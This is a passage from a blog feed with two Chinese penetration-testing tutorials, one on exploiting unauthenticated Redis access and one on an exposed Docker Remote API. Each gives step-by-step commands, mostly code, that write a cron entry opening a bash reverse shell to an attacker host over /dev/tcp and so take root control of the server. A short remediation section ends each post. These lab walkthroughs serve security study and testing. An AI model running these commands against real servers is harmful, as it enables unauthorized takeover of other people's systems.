    <url>/2020/05/25/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h4 id="漏洞简介及危害"><a href="#漏洞简介及危害" class="headerlink" title="漏洞简介及危害"></a>漏洞简介及危害</h4><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器、添加计划任务、写入Webshell等操作。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><pre><code class="hljs plain"># redis安装wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-3.2.0.tar.gztar -xvzf redis-3.2.0.tar.gzcd redis-3.2.0make# 修改配置文件vim redis.conf# bind 127.0.0.1               前面加上#号    # protected-mode设为no protected-mode no# 保存退出# 启动redis-serverredis-server redis-conf</code></pre><p>观察到如下输出，漏洞环境搭建成功<br><img src="/img/redis_res1.png" srcset="/img/loading.gif" alt="image"></p><h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><pre><code class="hljs plain"># 在攻击主机上打开9999端口监听[root@]# nc -vv -l -p 9999</code></pre><h5 id="未授权访问验证"><a href="#未授权访问验证" class="headerlink" title="未授权访问验证"></a>未授权访问验证</h5><pre><code class="hljs plain"># 连接靶机redisredis -h target_ip# 获取redis版本等信息target_ip&gt; info</code></pre><p><img src="/img/redis_res2.png" srcset="/img/loading.gif" alt="image"></p><h5 id="写入shell"><a href="#写入shell" class="headerlink" title="写入shell"></a>写入shell</h5><pre><code class="hljs plain"># 设置变量target_ip:6379&gt; set xx &quot;\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;attack_ip&#x2F;9999 0&gt;&amp;1\n&quot;OK# 修改redis默认目录和rdb文件target_ip:6379&gt; config set dir &#x2F;var&#x2F;spool&#x2F;cronOKtarget_ip:6379&gt; config set dbfilename rootOKtarget_ip:6379&gt; saveOK</code></pre><h5 id="成功反弹宿主机shell"><a href="#成功反弹宿主机shell" class="headerlink" title="成功反弹宿主机shell"></a>成功反弹宿主机shell</h5><p><img src="/img/redis_res3.png" srcset="/img/loading.gif" alt="image"></p><blockquote><p>P.S ，测试完记得关闭存在漏洞的redis</p></blockquote><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><p>方法一： 可以修改绑定的IP、端口和指定访问者IP 具体根据实际情况来设定，也可以直接在服务器防火墙上做设置。</p><p>方法二： 设置访问密码 在 redis.conf 中找到“requirepass”字段，取消注释并在后面填上你需要的密码。 注：修改redis的配置需要重启redis才能生效。</p><p>7 <a href="https://zhuanlan.zhihu.com/p/142798377" target="_blank" rel="noopener">🔗知乎链接</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker Remote API 未授权访问漏洞利用</title>
    <link href="/2020/05/23/Docker-Remote-API-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <url>/2020/05/23/Docker-Remote-API-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h4 id="漏洞简介及危害"><a href="#漏洞简介及危害" class="headerlink" title="漏洞简介及危害"></a>漏洞简介及危害</h4><p>Docker是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的LINUX机器上，也可以实现虚拟化。 Docker swarm 是一个将docker集群变成单一虚拟的docker host工具，使用标准的Docker API，能够方便docker集群的管理和扩展，由docker官方提供。</p><p>Docker Remote API 是一个取代远程命令行界面（rcli）的REST API。Docker Remote API如配置不当可导致未授权访问，攻击者利用 docker client 或者 http 直接请求就可以访问这个 API，可能导致敏感信息泄露，黑客也可以删除Docker上的数据。 攻击者可进一步利用Docker自身特性，直接访问宿主机上的敏感信息，或对敏感文件进行修改，最终完全控制服务器。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h5><pre><code class="hljs plain"># 靶机IP&#x2F;端口172.19.101.34 2375# 操作系统linux_x86</code></pre><h5 id="未授权访问测试"><a href="#未授权访问测试" class="headerlink" title="未授权访问测试"></a>未授权访问测试</h5><pre><code class="hljs plain">docker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 images# 返回镜像信息，漏洞存在</code></pre><h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><pre><code class="hljs plain"># 在攻击主机上打开8088端口监听[root@]# nc -vv -l -p 8088</code></pre><h5 id="写入shell"><a href="#写入shell" class="headerlink" title="写入shell"></a>写入shell</h5><p>创建容器，利用bash和crontab计划任务向宿主机写入shell，centos系统挂载路径为。 /var/spool/cron/root；ubuntu系统为/var/spool/cron/crontabs/root；</p><pre><code class="hljs plain"># 查看宿主机可用镜像docker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 images# 选择合适镜像创建容器docker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 run -it -v &#x2F;var&#x2F;spool&#x2F;cron&#x2F;:&#x2F;var&#x2F;spool&#x2F;cron&#x2F; image_id &#x2F;bin&#x2F;bash# 启动刚刚创建的容器并连接docker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 start ct_iddocker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 exec -it --user root ct_id &#x2F;bin&#x2F;bash# 执行shell反弹命令root@bfd2539dfdc8:&#x2F;# echo &#39;* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;attack_ip&#x2F;8088 0&gt;&amp;1&#39; &gt;&gt; &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</code></pre><h5 id="成功反弹宿主机shell"><a href="#成功反弹宿主机shell" class="headerlink" title="成功反弹宿主机shell"></a>成功反弹宿主机shell</h5><p><img src="/img/docker_res.png" srcset="/img/loading.gif" alt="image"></p><blockquote><p>P.S ，测试完记得删掉存在漏洞的容器</p></blockquote><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><p>临时解决方案：</p><p>1、对2375端口做网络访问控制，如设置iptables策略仅允许指定的IP来访问Docker接口；</p><p>2、修改docker swarm的认证方式，使用TLS认证：Overview Swarm with TLS 和 Configure Docker Swarm for TLS这两篇文档，说的是配置好TLS后，Docker CLI 在发送命令到docker daemon之前，会首先发送它的证书，如果证书是由daemon信任的CA所签名的，才可以继续执行。</p><p><strong>总之、不要将端口直接暴露在公网，内网中使用需要设置严格的访问规则，并使用TLS。</strong></p><p><a href="https://zhuanlan.zhihu.com/p/142798377" target="_blank" rel="noopener">🔗知乎链接</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
